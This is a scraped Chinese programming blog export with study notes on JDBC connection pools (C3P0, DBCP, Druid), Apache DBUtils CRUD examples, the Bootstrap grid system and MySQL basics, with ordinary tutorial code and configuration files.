数据库连接池技术的优点 1. 资源重用 由于数据库连接得以重用，避免了频繁创建，释放连接引起的大量性能开销。在减少系统消耗的基础上，另一方面也增加了系统运行环境的平稳性。 2. 更快的系统反应速度 数据库连接池在初始化过程中，往往已经创建了若干数据库连接置于连接池中备用。此时连接的初始化工作均已完成。对于业务请求处理而言，直接利用现有可用连接，避免了数据库连接初始化和释放过程的时间开销，从而减少了系统的响应时间 3. 新的资源分配手段 对于多应用共享同一数据库的系统而言，可在应用层通过数据库连接池的配置，实现某一应用最大可用数据库连接数的限制，避免某一应用独占所有的数据库资源 4. 统一的连接管理，避免数据库连接泄漏 在较为完善的数据库连接池实现中，可根据预先的占用超时设定，强制回收被占用连接，从而避免了常规数据库连接操作中可能出现的资源泄露 8.3 多种开源的数据库连接池 JDBC 的数据库连接池使用 javax.sql.DataSource 来表示，DataSource 只是一个接口，该接口通常由服务器(Weblogic, WebSphere, Tomcat)提供实现，也有一些开源组织提供实现： DBCP 是Apache提供的数据库连接池。tomcat 服务器自带dbcp数据库连接池。速度相对c3p0较快，但因自身存在BUG，Hibernate3已不再提供支持。 C3P0 是一个开源组织提供的一个数据库连接池，速度相对较慢，稳定性还可以。hibernate官方推荐使用 Proxool 是sourceforge下的一个开源项目数据库连接池，有监控连接池状态的功能，稳定性较c3p0差一点 BoneCP 是一个开源组织提供的数据库连接池，速度快 Druid 是阿里提供的数据库连接池，据说是集DBCP 、C3P0 、Proxool 优点于一身的数据库连接池，但是速度不确定是否有BoneCP快 DataSource 通常被称为数据源，它包含连接池和连接池管理两个部分，习惯上也经常把 DataSource 称为连接池 DataSource用来取代DriverManager来获取Connection，获取速度快，同时可以大幅度提高数据库访问速度。 特别注意： 数据源和数据库连接不同，数据源无需创建多个，它是产生数据库连接的工厂，因此整个应用只需要一个数据源即可。 当数据库访问结束后，程序还是像以前一样关闭数据库连接：conn.close(); 但conn.close()并没有关闭数据库的物理连接，它仅仅把数据库连接释放，归还给了数据库连接池。 8.3.1 C3P0数据库连接池 获取连接方式一 1//使用C3P0数据库连接池的方式，获取数据库的连接：不推荐public static Connection getConnection1() throws Exception&#123; ComboPooledDataSource cpds = new ComboPooledDataSource(); cpds.setDriverClass(&quot;com.mysql.jdbc.Driver&quot;); cpds.setJdbcUrl(&quot;jdbc:mysql://localhost:3306/test&quot;); cpds.setUser(&quot;root&quot;); cpds.setPassword(&quot;abc123&quot;); // cpds.setMaxPoolSize(100); Connection conn = cpds.getConnection(); return conn;&#125; 获取连接方式二 1//使用C3P0数据库连接池的配置文件方式，获取数据库的连接：推荐private static DataSource cpds = new ComboPooledDataSource(&quot;helloc3p0&quot;);public static Connection getConnection2() throws SQLException&#123; Connection conn = cpds.getConnection(); return conn;&#125; 其中，src下的配置文件为：【c3p0-config.xml】 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;c3p0-config&gt; &lt;named-config name=&quot;helloc3p0&quot;&gt; &lt;!-- 获取连接的4个基本信息 --&gt; &lt;property name=&quot;user&quot;&gt;root&lt;/property&gt; &lt;property name=&quot;password&quot;&gt;abc123&lt;/property&gt; &lt;property name=&quot;jdbcUrl&quot;&gt;jdbc:mysql:///test&lt;/property&gt; &lt;property name=&quot;driverClass&quot;&gt;com.mysql.jdbc.Driver&lt;/property&gt; &lt;!-- 涉及到数据库连接池的管理的相关属性的设置 --&gt; &lt;!-- 若数据库中连接数不足时, 一次向数据库服务器申请多少个连接 --&gt; &lt;property name=&quot;acquireIncrement&quot;&gt;5&lt;/property&gt; &lt;!-- 初始化数据库连接池时连接的数量 --&gt; &lt;property name=&quot;initialPoolSize&quot;&gt;5&lt;/property&gt; &lt;!-- 数据库连接池中的最小的数据库连接数 --&gt; &lt;property name=&quot;minPoolSize&quot;&gt;5&lt;/property&gt; &lt;!-- 数据库连接池中的最大的数据库连接数 --&gt; &lt;property name=&quot;maxPoolSize&quot;&gt;10&lt;/property&gt; &lt;!-- C3P0 数据库连接池可以维护的 Statement 的个数 --&gt; &lt;property name=&quot;maxStatements&quot;&gt;20&lt;/property&gt; &lt;!-- 每个连接同时可以使用的 Statement 对象的个数 --&gt; &lt;property name=&quot;maxStatementsPerConnection&quot;&gt;5&lt;/property&gt; &lt;/named-config&gt;&lt;/c3p0-config&gt; 8.3.2 DBCP数据库连接池 DBCP 是 Apache 软件基金组织下的开源连接池实现，该连接池依赖该组织下的另一个开源系统：Common-pool。如需使用该连接池实现，应在系统中增加如下两个 jar 文件： Commons-dbcp.jar：连接池的实现 Commons-pool.jar：连接池实现的依赖库 Tomcat 的连接池正是采用该连接池来实现的。该数据库连接池既可以与应用服务器整合使用，也可由应用程序独立使用。 数据源和数据库连接不同，数据源无需创建多个，它是产生数据库连接的工厂，因此整个应用只需要一个数据源即可。 当数据库访问结束后，程序还是像以前一样关闭数据库连接：conn.close(); 但上面的代码并没有关闭数据库的物理连接，它仅仅把数据库连接释放，归还给了数据库连接池。 配置属性说明 属性 默认值 说明 initialSize 0 连接池启动时创建的初始化连接数量 maxActive 8 连接池中可同时连接的最大的连接数 maxIdle 8 连接池中最大的空闲的连接数，超过的空闲连接将被释放，如果设置为负数表示不限制 minIdle 0 连接池中最小的空闲的连接数，低于这个数量会被创建新的连接。该参数越接近maxIdle，性能越好，因为连接的创建和销毁，都是需要消耗资源的；但是不能太大。 maxWait 无限制 最大等待时间，当没有可用连接时，连接池等待连接释放的最大时间，超过该时间限制会抛出异常，如果设置-1表示无限等待 poolPreparedStatements false 开启池的Statement是否prepared maxOpenPreparedStatements 无限制 开启池的prepared 后的同时最大连接数 minEvictableIdleTimeMillis 连接池中连接，在时间段内一直空闲， 被逐出连接池的时间 removeAbandonedTimeout 300 超过时间限制，回收没有用(废弃)的连接 removeAbandoned false 超过removeAbandonedTimeout时间后，是否进 行没用连接（废弃）的回收 获取连接方式一： 1public static Connection getConnection3() throws Exception &#123; BasicDataSource source = new BasicDataSource(); source.setDriverClassName(&quot;com.mysql.jdbc.Driver&quot;); source.setUrl(&quot;jdbc:mysql:///test&quot;); source.setUsername(&quot;root&quot;); source.setPassword(&quot;abc123&quot;); // source.setInitialSize(10); Connection conn = source.getConnection(); return conn;&#125; 获取连接方式二： 1//使用dbcp数据库连接池的配置文件方式，获取数据库的连接：推荐private static DataSource source = null;static&#123; try &#123; Properties pros = new Properties(); InputStream is = DBCPTest.class.getClassLoader().getResourceAsStream(&quot;dbcp.properties&quot;); pros.load(is); //根据提供的BasicDataSourceFactory创建对应的DataSource对象 source = BasicDataSourceFactory.createDataSource(pros); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;public static Connection getConnection4() throws Exception &#123; Connection conn = source.getConnection(); return conn;&#125; 其中，src下的配置文件为：【dbcp.properties】 1driverClassName=com.mysql.jdbc.Driverurl=jdbc:mysql://localhost:3306/test?rewriteBatchedStatements=true&amp;useServerPrepStmts=falseusername=rootpassword=abc123initialSize=10#... 8.3.3 Druid（德鲁伊）数据库连接池Druid是阿里巴巴开源平台上一个数据库连接池实现，它结合了C3P0、DBCP、Proxool等DB池的优点，同时加入了日志监控，可以很好的监控DB池连接和SQL的执行情况，可以说是针对监控而生的DB连接池，可以说是目前最好的连接池之一。 1package com.atguigu.druid;import java.sql.Connection;import java.util.Properties;import javax.sql.DataSource;import com.alibaba.druid.pool.DruidDataSourceFactory;public class TestDruid &#123; public static void main(String[] args) throws Exception &#123; Properties pro = new Properties(); pro.load(TestDruid.class.getClassLoader().getResourceAsStream(&quot;druid.properties&quot;)); DataSource ds = DruidDataSourceFactory.createDataSource(pro); Connection conn = ds.getConnection(); System.out.println(conn); &#125;&#125; 其中，src下的配置文件为：【druid.properties】 1url=jdbc:mysql://localhost:3306/test?rewriteBatchedStatements=trueusername=rootpassword=123456driverClassName=com.mysql.jdbc.DriverinitialSize=10maxActive=20maxWait=1000filters=wall 详细配置参数： 配置 缺省 说明 name 配置这个属性的意义在于，如果存在多个数据源，监控的时候可以通过名字来区分开来。 如果没有配置，将会生成一个名字，格式是：”DataSource-” + System.identityHashCode(this) url 连接数据库的url，不同数据库不一样。例如：mysql : jdbc:mysql://10.20.153.104:3306/druid2 oracle : jdbc:oracle:thin:@10.20.149.85:1521:ocnauto username 连接数据库的用户名 password 连接数据库的密码。如果你不希望密码直接写在配置文件中，可以使用ConfigFilter。详细看这里：https://github.com/alibaba/druid/wiki/%E4%BD%BF%E7%94%A8ConfigFilter driverClassName 根据url自动识别 这一项可配可不配，如果不配置druid会根据url自动识别dbType，然后选择相应的driverClassName(建议配置下) initialSize 0 初始化时建立物理连接的个数。初始化发生在显示调用init方法，或者第一次getConnection时 maxActive 8 最大连接池数量 maxIdle 8 已经不再使用，配置了也没效果 minIdle 最小连接池数量 maxWait 获取连接时最大等待时间，单位毫秒。配置了maxWait之后，缺省启用公平锁，并发效率会有所下降，如果需要可以通过配置useUnfairLock属性为true使用非公平锁。 poolPreparedStatements false 是否缓存preparedStatement，也就是PSCache。PSCache对支持游标的数据库性能提升巨大，比如说oracle。在mysql下建议关闭。 maxOpenPreparedStatements -1 要启用PSCache，必须配置大于0，当大于0时，poolPreparedStatements自动触发修改为true。在Druid中，不会存在Oracle下PSCache占用内存过多的问题，可以把这个数值配置大一些，比如说100 validationQuery 用来检测连接是否有效的sql，要求是一个查询语句。如果validationQuery为null，testOnBorrow、testOnReturn、testWhileIdle都不会其作用。 testOnBorrow true 申请连接时执行validationQuery检测连接是否有效，做了这个配置会降低性能。 testOnReturn false 归还连接时执行validationQuery检测连接是否有效，做了这个配置会降低性能 testWhileIdle false 建议配置为true，不影响性能，并且保证安全性。申请连接的时候检测，如果空闲时间大于timeBetweenEvictionRunsMillis，执行validationQuery检测连接是否有效。 timeBetweenEvictionRunsMillis 有两个含义： 1)Destroy线程会检测连接的间隔时间2)testWhileIdle的判断依据，详细看testWhileIdle属性的说明 numTestsPerEvictionRun 不再使用，一个DruidDataSource只支持一个EvictionRun minEvictableIdleTimeMillis connectionInitSqls 物理连接初始化的时候执行的sql exceptionSorter 根据dbType自动识别 当数据库抛出一些不可恢复的异常时，抛弃连接 filters 属性类型是字符串，通过别名的方式配置扩展插件，常用的插件有： 监控统计用的filter:stat日志用的filter:log4j防御sql注入的filter:wall proxyFilters 类型是List，如果同时配置了filters和proxyFilters，是组合关系，并非替换关系 第9章：Apache-DBUtils实现CRUD操作9.1 Apache-DBUtils简介 commons-dbutils 是 Apache 组织提供的一个开源 JDBC工具类库，它是对JDBC的简单封装，学习成本极低，并且使用dbutils能极大简化jdbc编码的工作量，同时也不会影响程序的性能。 API介绍： org.apache.commons.dbutils.QueryRunner org.apache.commons.dbutils.ResultSetHandler 工具类：org.apache.commons.dbutils.DbUtils API包说明： 9.2 主要API的使用9.2.1 DbUtils DbUtils ：提供如关闭连接、装载JDBC驱动程序等常规工作的工具类，里面的所有方法都是静态的。主要方法如下： public static void close(…) throws java.sql.SQLException： DbUtils类提供了三个重载的关闭方法。这些方法检查所提供的参数是不是NULL，如果不是的话，它们就关闭Connection、Statement和ResultSet。 public static void closeQuietly(…): 这一类方法不仅能在Connection、Statement和ResultSet为NULL情况下避免关闭，还能隐藏一些在程序中抛出的SQLEeception。 public static void commitAndClose(Connection conn)throws SQLException： 用来提交连接的事务，然后关闭连接 public static void commitAndCloseQuietly(Connection conn)： 用来提交连接，然后关闭连接，并且在关闭连接时不抛出SQL异常。 public static void rollback(Connection conn)throws SQLException：允许conn为null，因为方法内部做了判断 public static void rollbackAndClose(Connection conn)throws SQLException rollbackAndCloseQuietly(Connection) public static boolean loadDriver(java.lang.String driverClassName)：这一方装载并注册JDBC驱动程序，如果成功就返回true。使用该方法，你不需要捕捉这个异常ClassNotFoundException。 9.2.2 QueryRunner类 该类简单化了SQL查询，它与ResultSetHandler组合在一起使用可以完成大部分的数据库操作，能够大大减少编码量。 QueryRunner类提供了两个构造器： 默认的构造器 需要一个 javax.sql.DataSource 来作参数的构造器 QueryRunner类的主要方法： 更新 public int update(Connection conn, String sql, Object… params) throws SQLException:用来执行一个更新（插入、更新或删除）操作。 …… 插入 public T insert(Connection conn,String sql,ResultSetHandler rsh, Object… params) throws SQLException：只支持INSERT语句，其中 rsh - The handler used to create the result object from the ResultSet of auto-generated keys. 返回值: An object generated by the handler.即自动生成的键值 …. 批处理 public int[] batch(Connection conn,String sql,Object[][] params)throws SQLException： INSERT, UPDATE, or DELETE语句 public T insertBatch(Connection conn,String sql,ResultSetHandler rsh,Object[][] params)throws SQLException：只支持INSERT语句 ….. 查询 public Object query(Connection conn, String sql, ResultSetHandler rsh,Object… params) throws SQLException：执行一个查询操作，在这个查询中，对象数组中的每个元素值被用来作为查询语句的置换参数。该方法会自行处理 PreparedStatement 和 ResultSet 的创建和关闭。 …… 测试 1// 测试添加@Testpublic void testInsert() throws Exception &#123; QueryRunner runner = new QueryRunner(); Connection conn = JDBCUtils.getConnection3(); String sql = &quot;insert into customers(name,email,birth)values(?,?,?)&quot;; int count = runner.update(conn, sql, &quot;何成飞&quot;, &quot;he@qq.com&quot;, &quot;1992-09-08&quot;); System.out.println(&quot;添加了&quot; + count + &quot;条记录&quot;); JDBCUtils.closeResource(conn, null);&#125; 1// 测试删除@Testpublic void testDelete() throws Exception &#123; QueryRunner runner = new QueryRunner(); Connection conn = JDBCUtils.getConnection3(); String sql = &quot;delete from customers where id &lt; ?&quot;; int count = runner.update(conn, sql,3); System.out.println(&quot;删除了&quot; + count + &quot;条记录&quot;); JDBCUtils.closeResource(conn, null);&#125; 9.2.3 ResultSetHandler接口及实现类 该接口用于处理 java.sql.ResultSet，将数据按要求转换为另一种形式。 ResultSetHandler 接口提供了一个单独的方法：Object handle (java.sql.ResultSet .rs)。 接口的主要实现类： ArrayHandler：把结果集中的第一行数据转成对象数组。 ArrayListHandler：把结果集中的每一行数据都转成一个数组，再存放到List中。 BeanHandler：将结果集中的第一行数据封装到一个对应的JavaBean实例中。 BeanListHandler：将结果集中的每一行数据都封装到一个对应的JavaBean实例中，存放到List里。 ColumnListHandler：将结果集中某一列的数据存放到List中。 KeyedHandler(name)：将结果集中的每一行数据都封装到一个Map里，再把这些map再存到一个map里，其key为指定的key。 MapHandler：将结果集中的第一行数据封装到一个Map里，key是列名，value就是对应的值。 MapListHandler：将结果集中的每一行数据都封装到一个Map里，然后再存放到List ScalarHandler：查询单个值对象 测试 1/* * 测试查询:查询一条记录 * * 使用ResultSetHandler的实现类：BeanHandler */@Testpublic void testQueryInstance() throws Exception&#123; QueryRunner runner = new QueryRunner(); Connection conn = JDBCUtils.getConnection3(); String sql = &quot;select id,name,email,birth from customers where id = ?&quot;; // BeanHandler&lt;Customer&gt; handler = new BeanHandler&lt;&gt;(Customer.class); Customer customer = runner.query(conn, sql, handler, 23); System.out.println(customer); JDBCUtils.closeResource(conn, null);&#125; 1/* * 测试查询:查询多条记录构成的集合 * * 使用ResultSetHandler的实现类：BeanListHandler */@Testpublic void testQueryList() throws Exception&#123; QueryRunner runner = new QueryRunner(); Connection conn = JDBCUtils.getConnection3(); String sql = &quot;select id,name,email,birth from customers where id &lt; ?&quot;; // BeanListHandler&lt;Customer&gt; handler = new BeanListHandler&lt;&gt;(Customer.class); List&lt;Customer&gt; list = runner.query(conn, sql, handler, 23); list.forEach(System.out::println); JDBCUtils.closeResource(conn, null);&#125; 1/* * 自定义ResultSetHandler的实现类 */@Testpublic void testQueryInstance1() throws Exception&#123; QueryRunner runner = new QueryRunner(); Connection conn = JDBCUtils.getConnection3(); String sql = &quot;select id,name,email,birth from customers where id = ?&quot;; ResultSetHandler&lt;Customer&gt; handler = new ResultSetHandler&lt;Customer&gt;() &#123; @Override public Customer handle(ResultSet rs) throws SQLException &#123; System.out.println(&quot;handle&quot;);// return new Customer(1,&quot;Tom&quot;,&quot;tom@126.com&quot;,new Date(123323432L)); if(rs.next())&#123; int id = rs.getInt(&quot;id&quot;); String name = rs.getString(&quot;name&quot;); String email = rs.getString(&quot;email&quot;); Date birth = rs.getDate(&quot;birth&quot;); return new Customer(id, name, email, birth); &#125; return null; &#125; &#125;; Customer customer = runner.query(conn, sql, handler, 23); System.out.println(customer); JDBCUtils.closeResource(conn, null);&#125; 1/* * 如何查询类似于最大的，最小的，平均的，总和，个数相关的数据， * 使用ScalarHandler * */@Testpublic void testQueryValue() throws Exception&#123; QueryRunner runner = new QueryRunner(); Connection conn = JDBCUtils.getConnection3(); //测试一：// String sql = &quot;select count(*) from customers where id &lt; ?&quot;;// ScalarHandler handler = new ScalarHandler();// long count = (long) runner.query(conn, sql, handler, 20);// System.out.println(count); //测试二： String sql = &quot;select max(birth) from customers&quot;; ScalarHandler handler = new ScalarHandler(); Date birth = (Date) runner.query(conn, sql, handler); System.out.println(birth); JDBCUtils.closeResource(conn, null);&#125; JDBC总结1总结@Testpublic void testUpdateWithTx() &#123; Connection conn = null; try &#123; //1.获取连接的操作（ //① 手写的连接：JDBCUtils.getConnection(); //② 使用数据库连接池：C3P0;DBCP;Druid //2.对数据表进行一系列CRUD操作 //① 使用PreparedStatement实现通用的增删改、查询操作（version 1.0 \\ version 2.0)//version2.0的增删改public void update(Connection conn,String sql,Object ... args)&#123;&#125;//version2.0的查询 public &lt;T&gt; T getInstance(Connection conn,Class&lt;T&gt; clazz,String sql,Object ... args)&#123;&#125; //② 使用dbutils提供的jar包中提供的QueryRunner类 //提交数据 conn.commit(); &#125; catch (Exception e) &#123; e.printStackTrace(); try &#123; //回滚数据 conn.rollback(); &#125; catch (SQLException e1) &#123; e1.printStackTrace(); &#125; &#125;finally&#123; //3.关闭连接等操作 //① JDBCUtils.closeResource(); //② 使用dbutils提供的jar包中提供的DbUtils类提供了关闭的相关操作 &#125;&#125;","categories":[],"tags":[{"name":"JDBC","slug":"JDBC","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/JDBC/"}]},{"title":"Bootstrap","slug":"Bootstrap快速入门","date":"2021-07-20T03:09:12.000Z","updated":"2021-09-11T08:15:54.456Z","comments":true,"path":"2021/07/20/Bootstrap快速入门/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/07/20/Bootstrap%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/","excerpt":"","text":"简介BootStrap：基于JS、CSS、HTML，来源于twitter 定义好了很多css样式和插件，我们开发人员可以使用这些样式和插件得到丰富的页面效果。 响应式布局：同一套页面兼容不同的分辨率设备。 实现：依赖于栅格系统。将一行平均分成12个格子，可以指定元素占有几个格子。 快速入门下载bootsrtap 复制三个文件夹 创建html文件，引入必要资源（自行修改）。 栅格系统例如：一个div标签，在PC机上占4个格子，在手机上占用12个格子。 步骤： 定义容器。相当于table 定义行。相当于之前的tr .container：固定宽度，每种设备一种宽度（常用，有留白更舒适） .container-fluid：每一种设备都是100%宽度 定义元素。相当于td，指定该元素在不同设备上，所占的格子的数目。 样式:col-设备代号-格子数目(1-12); 设备代号： col-xs： col-sm： col-md： col-lg： 1 栅格系统用于通过一系列的行（row）与列（column）的组合来创建页面布局，你的内容就可以放入这些创建好的布局中。下面就介绍一下 Bootstrap 栅格系统的工作原理： “行（row）”必须包含在 .container （固定宽度）或 .container-fluid （100% 宽度）中，以便为其赋予合适的排列（aligment）和内补（padding）。通过“行（row）”在水平方向创建一组“列（column）”。你的内容应当放置于“列（column）”内，并且，只有“列（column）”可以作为行（row）”的直接子元素。类似 .row 和 .col-xs-4 这种预定义的类，可以用来快速创建栅格布局。Bootstrap 源码中定义的 mixin 也可以用来创建语义化的布局。通过为“列（column）”设置 padding 属性，从而创建列与列之间的间隔（gutter）。通过为 .row 元素设置负值 margin 从而抵消掉为 .container 元素设置的 padding，也就间接为“行（row）”所包含的“列（column）”抵消掉了padding。负值的 margin就是下面的示例为什么是向外突出的原因。在栅格列中的内容排成一行。栅格系统中的列是通过指定1到12的值来表示其跨越的范围。例如，三个等宽的列可以使用三个 .col-xs-4 来创建。如果一“行（row）”中包含了的“列（column）”大于 12，多余的“列（column）”所在的元素将被作为一个整体另起一行排列。栅格类适用于与屏幕宽度大于或等于分界点大小的设备 ， 并且针对小屏幕设备覆盖栅格类。 因此，在元素上应用任何 .col-md-* 栅格类适用于与屏幕宽度大于或等于分界点大小的设备 ， 并且针对小屏幕设备覆盖栅格类。 因此，在元素上应用任何 .col-lg-* 不存在， 也影响大屏幕设备。 超小屏幕 手机 (&lt;768px) 小屏幕 平板 (≥768px) 中等屏幕 桌面显示器 (≥992px) 大屏幕 大桌面显示器 (≥1200px) 栅格系统行为 总是水平排列 开始是堆叠在一起的，当大于这些阈值时将变为水平排列C .container 最大宽度 None （自动） 750px 970px 1170px 类前缀 .col-xs- .col-sm- .col-md- .col-lg- 列（column）数 12 最大列（column）宽 自动 ~62px ~81px ~97px 槽（gutter）宽 30px （每列左右均有 15px） 可嵌套 是 偏移（Offsets） 是 列排序 是 注意事项： 一行中如果格子数目超出12，则超出部分自动换行 栅格类属性向上兼容！！！ 如果真实设备宽度小于了设备栅格类属性的设备代码的最小值，默认会一个元素占满一整行。（不向下兼容） 全局CSS按钮 按钮 图片 表格 表单 组件 导航条 分页条 插件 轮播图","categories":[],"tags":[{"name":"前端","slug":"前端","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/%E5%89%8D%E7%AB%AF/"}]},{"title":"Mysql基础与高级","slug":"mysql","date":"2021-07-19T13:16:36.000Z","updated":"2021-09-11T06:53:37.003Z","comments":true,"path":"2021/07/19/mysql/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/07/19/mysql/","excerpt":"","text":"哔哩哔哩：尚硅谷 Mysql基础启动与停止mysql注意：管理员身份进入cmd 123net stop MySqlnet start MySql mysql服务器端的登录与退出方式一：Mysql自带的客户端仅限于root用户 方式二：通过windows自带的客户端 登录 1234567# 非本机mysql [-h主机名 -P端口号] -u用户名 -p密码# 本机mysql -h localhost -P 3306 -u root -p[******](无空格)mysql -u root -pexit / ctrl + c mysql常见命令123456789101112131415161718192021# 查看当前所有数据库show databases;# 打开指定库use 库名;# 查看当前库所有表show tables;# 查看其他库所有表show tables from 库名;# 建表create table 表名( 列名 列类型, 列名 列类型, ……);# 查看表结构desc 表名;# 查看服务器版本方式一：登录到mysql服务器select version();方式二：没有登录到mysql服务器mysql --version/ mysql -V MySql语法规范 不区分大小写，建议关键字大写，表名，列名小写 每条命令用最好用分号结尾 每条可以根据需要，进行换行缩进 注释 单行注释：# 注释文字 单行注释：– 注释文字 多行注释： /*注释文字*/ 026使用函数concat()实现多个字符串拼接 027DESC 表名 ： 查看表的结构 IFNULL(A,B)函数：如果查询字段A为NULL，则返回B，否则保持A不变。 028&lt;&gt;：等同于不等于!= &amp;&amp; || ! / and or not like between and in is null / is not null 029最好使用&lt;&gt;代替!= 030模糊查询 1SELECT * FROM employees WHERE last_name LIKE &#x27;%a%&#x27;; LIKE关键字： 一般和通配符搭配使用： %可以匹配任意多个字符(零个或多个字符) 可以判断字符型或数值型 _任意单个字符 转义使用 \\ SELECT * FROM employees WHERE last_name LIKE &#39;_$_&#39; ESCAPE &#39;$&#39;; // 声明$为转义字符。 12345678910* BETWEEN AND * 包含临界值 * 两个临界值不能交换顺序* IN * ```sql WHERE job_id in (&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;); 判断某字段是否属于in列表中的某一项。 IN列表的类型必须一致或兼容。 IN不支持通配符 IS NULL 等于运算符不能判断NULL值。 安全等于&lt;=&gt; 可以判断NULL，普通类型值。 字符型和日期型常量值必须用’’括起来。 031ISNULL 返回 1 / 原本值：判断某字段是否为NULL，如果是，则返回1，否则返回0。 045字符函数，utf-8中，一个汉字占3字节，一个英文字母占一字节。GBK字符集中，一个汉字占两个字节。 获取使用字符集的情况： 1SHOW VARIBALES LIKE &#x27;%char%&#x27;; LENGTH()：获取参数值字节数。 CONCAT()：拼接字符。 UPPER / LOWER：转换大小写。 SUBSTRING / SUBSTR 12345# 注意：索引从1开始#截取从指定索引处后面所有字符SELECT SUBSTR(&#x27;雨过天晴云破除&#x27;,5); // 返回云破除#截取从指定索引处指定字符长度的字符SELECT SUBSTR(&#x27;雨过天晴云破除&#x27;,1,4); //雨过天晴 INSTR：返回子串第一次出现的索引，如果找不到，返回0。 TRIM：去掉前后空格。 去掉前后指定字符： 12#去掉前后的aSELECT TRIM(&#x27;a&#x27; FROM &#x27;aaaaaaaaa小aaa七aaaaaaaa&#x27;); LPAD / RPAD： 12# 用指定的字符实现左填充指定字符长度SELECT LPAD(&#x27;白纵生&#x27;,10,&#x27;*&#x27;)AS out_put; REPLACE：用指定的字符串替换目标字符串。 046数学函数： ROUND：四舍五入（绝对值） 12# 保留几位小数。SELECT ROUND(1.595,2); CEIL：向上取整，返回大于等于该参数的最小整数（负数也是）。 FLOOR：向下取整，返回小于等于该参数的最大整数（负数也是）。 TRUNCATE：截断。 1SELECT TRUNCATE(1.65,1); #小数点后保留1位。 MOD：取余。（等价于%） RAND()：获取随机数，返回0-1之间的小数 047日期函数 #now：返回当前系统日期 + 时间 1SELECT NOW(); #CURDATE ：返回当前系统日期，不包含时间。 1SELECT CURDATE(); #CURTIME：返回当前系统时间，不包含日期。 1SELECT CURTIME(); #可以获取指定部分的年、月、日、时、分、秒 123SELECT YEAR(NOW()) AS 年;SELECT YEAR(hiredate) AS 年 FROM employee;SELECT MONTHNAME(NOW()) AS 月; #str_to_date：将日期格式的字符串转换为指定格式的日期（解析）。 1STR_TO-DATE(&#x27;9-13-2021&#x27;,&#x27;%m-%d-%Y&#x27;); //2021-9-13 格式符 功能 %Y 4位的年份 %y 2位的年份 %m 月份(01,02……,12) %c 月份(1,2,3……12) %d 日(01,02,……) %H 小时（24小时制） %h 小时（12小时制） %i 分钟（00，01，……，59） %s 秒（00，01，……，59） #date_format：将日期转换为字符。 1DATE_FORMAT(&#x27;2018/6/6&#x27;,&#x27;%Y年%m月%d日&#x27;); 048其他函数 12345SELECT VERSION();SELECT DATABASE();SELECT USER();SELECT PASSWORD(&#x27;张加林&#x27;); #加密SELECT MD5(&#x27;张加林&#x27;); MD5#加密 049流程控制函数 if函数：if else的效果 12SELECT IF(expression1,expression2,expression3);# 判断1的真假，如果真，返回2，否则返回3 050case函数的使用1：switch case的效果 1234567case 要判断的字段或表达式when 常量1 then 要显示的值1或语句1when 常量2 then 要显示的值2或语句2……else 要显示的值n,或语句nend#千万注意，没有&#x27;;&#x27;!!!!! case函数的使用2：类似于 多重if 123456casewhen 条件1 then 要显示的值1或语句1;when 条件2 then 要显示的值2或语句2;……else 要显示的值n或语句nend 首字符排序不同于完整的字符排序 051分组函数：用作统计使用，又被称为聚合函数或统计函数或组函数。 SUM AVG：忽略NULL MAX：忽略NULL MIN：忽略NULL COUNT：注意！计算非空行数，NULL字段不会被计算进去（忽略NULL）。 COUNT(*)统计行数 058DATEDIFF(a,b)：求a,b两天之间的天数差。 071进行多表连接时，为表起别名后，原名称失效，必须使用别名。 073非等值连接 例子： 123SELECT salary,grade_levelFROM employees AS A,jod_grades gWHERE salary BETWEEN g.&#x27;lowest_sal&#x27; AND g.&#x27;highest_sal&#x27;; 123SELECT salary,grade_levelFROM employees AS e,job_grades gWHERE e.salary BETWEEN g.&#x27;lowest_sal&#x27; AND g.&#x27;highest_sal&#x27;; 074自连接：别名的好处！！！ 123SELECT e.employee_id,e.last_name,m.employee_id,m.last_nameFROM employees e,employees mWHERE e.&#x27;employee_id&#x27; = m.&#x27;employee_id&#x27;; 079 sql99分类： 内连接： inner JOIN：可以省略 外连接： left JOIN right JOIN 交叉连接： cross JOIN：求笛卡尔积 089多行子查询 操作符 含义 IN/NOT IN 等于列表中的任意一个（IN可以使用ANY来代替） ANY/SOME 和子查询返回的某一个值比较，满足任意一个即可（ANY可以使用最大最小来代替） ALL 和子查询返回的所有值比较，需要满足所有 092FROM后面的子查询使用：将子查询结果当做一张表来使用，这张表必须取别名。 093相关子查询：EXISTS(查询语句)，返回BOOL值（0/1），判断子查询返回值是否为空。 095分页查询：当要显示的数据，一页显示不全，需要分页提交sql。 要显示的页数page，每页的条目数size：LIMIT (page-1)*size,size; 12345# 关键代码# 查询时添加的内容，放在查询语句最后，也是最后执行的。LIMIT OFFSET,SIZE;# offset要显示条目的起始索引（起始索引从0开始，为0可以省略）# SIZE要显示的条目个数 100union 联合 合并：将多条查询语句的结果合并为一个结果，就是语句拆分，方便观看。 查询语句1 union 查询语句2 12345# 应用场景：要查询的结果来自于多个表，且多个表没有直接的连接关系，但查询的信息一致时可以使用。# 多表查询结果联合SELECT id,cname,csex FROM t_ca WHERE csex=&#x27;男&#x27;unionSELECT t_id,tName,tGender FROM t_ua WHERE tGender = &#x27;male&#x27;; 注意： 要求联合查询时，查询的列数必须一致。 要求多条查询语句的每一列的类型和顺序最好一致。 结果集合会自动过滤去重，不想去重，可以添加关键字ALL（UNION ALL） 104方式一：insert into 表名 values(),(),(),……; 方式二：insert into 表名 set ……; 方式一，可以实现一条语句插入多条数据；方式二不行 方式一支持子查询；方式二不支持。（insert into select将结果集插入表中） 106修改多表的记录 sql92： 1234update 表1,表2set 列=值，……where 连接条件and 筛选条件; sql 99： 123update 表1 别名,left|right|inner join 表2 别名 on 连接条件set 列=值，……where 筛选条件; 107整个表删除： DELETE FROM 表名； TRUNCATE TABLE 表名; 108多表级联删除 sql92 123DELETE 表1的别名|表2的别名FROM 表1 别名，表2 别名WHERE 连接条件 AND 筛选条件; sql99 123DELETE 表1的别名[,表2的别名]FROM 表1 别名 LEFT|RIGHT|INNER JOIN 表2 别名 ON ……WHERE 筛选条件; 109注意：TRUNCATE语句加WHERE会报错！只能单独使用。 TRUNCATE与DELETE的区别： 前者不能加WHERE，后者可以。 前者效率高于后者 